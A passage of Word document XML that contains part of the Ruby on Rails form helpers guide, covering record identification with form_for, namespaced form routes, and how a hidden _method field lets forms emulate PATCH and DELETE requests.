          </w:tcPr>
          <w:p w14:paraId="180BB310" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1741949993"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>resources :articles</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="41218BB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Declaring a resource has a number of side-affects. See </w:t>
      </w:r>
      <w:hyperlink r:id="rId304" w:anchor="resource-routing-the-rails-default" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails Routing From the Outside In</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for more information on setting up and using resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF9C69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When dealing with RESTful resources, calls to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can get significantly easier if you rely on </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>record identification</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. In short, you can just pass the model instance and have Rails figure out model name and the rest:</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382F195E" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0F448A4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Creating a new article</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53790C6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long-style:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65DD79A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form_for(@article, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; articles_path)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C90B1E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same thing, short-style (record identification gets used):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56064B5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form_for(@article)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A84AFF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5F5F06B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Editing an existing article</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B90B97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long-style:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A27420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form_for(@article, :url</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; article_path(@article), :html</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "patch"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F1BCFF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short-style:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5905378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form_for(@article)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="01ED0C4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Notice how the short-style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invocation is conveniently the same, regardless of the record being new or existing. Record identification is smart enough to figure out if the record is new by asking </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>record.new_record?</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. It also selects the correct path to submit to and the name based on the class of the object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFC030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will also automatically set the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the form appropriately: a form creating an article would have </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w: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new_article</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. If you were editing the article with id 23, the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>class</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> would be set to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_article</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the id to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_article_23</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. These attributes will be omitted for brevity in the rest of this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480D5FE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When you’re using STI (single-table inheritance) with your models, you can’t rely on record identification on a subclass if only their parent class is declared a resource. You will have to specify the model name, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:method</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> explicitly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4425774A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.3.1 Dealing with Namespaces</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5E1F3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If you have created namespaced routes,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has a nifty shorthand for that too. If your application has an admin namespace then</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3E246276" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71E01F79" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2137210627"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>form_for [:admin, @article]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="14E22C4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will create a form that submits to the articles controller inside the admin namespace (submitting to </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>admin_article_path(@article)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the case of an update). If you have several levels of namespacing then the syntax is similar:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="40415FFE" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43CA3ADF" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2082629256"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>form_for [:admin, :management, @article]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="270C6B1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For more information on Rails’ routing system and the associated conventions, please see the </w:t>
      </w:r>
      <w:hyperlink r:id="rId305" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>routing guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227526B3"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2.4 How do forms with PATCH, PUT, or DELETE methods work?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="035A769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Rails framework encourages RESTful design of your applications, which means you’ll be making a lot of “PATCH” and “DELETE” requests (besides “GET” and “POST”). However, most browsers </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>don’t support</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> methods other than “GET” and “POST” when it comes to submitting forms.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40848FB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works around this issue by emulating other methods over POST with a hidden input named </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"_method"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, which is set to reflect the desired method:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="07EB3662" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38895769" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1080249930"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>form_tag(search_path, :method</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "patch")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6591FBE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output:</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3AB061F4" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C79D6D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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/search"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="59349F1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&lt;div</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>style="margin:0;padding:0"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52C9430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name="_method"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="patch"</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0E1C2F9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name="utf8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
